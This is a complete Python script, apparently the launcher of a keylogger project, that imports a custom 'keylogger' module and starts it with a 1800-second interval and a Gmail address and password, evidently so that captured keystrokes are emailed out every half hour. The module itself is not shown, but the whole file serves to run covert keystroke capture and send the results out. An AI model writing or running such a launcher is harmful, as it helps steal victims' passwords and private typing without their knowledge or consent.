#!/usr/bin/env python
import keylogger

email = "xxx@gmail.com"
password = ""

my_keylogger = keylogger.Keylogger(1800, email, password)
my_keylogger.start()
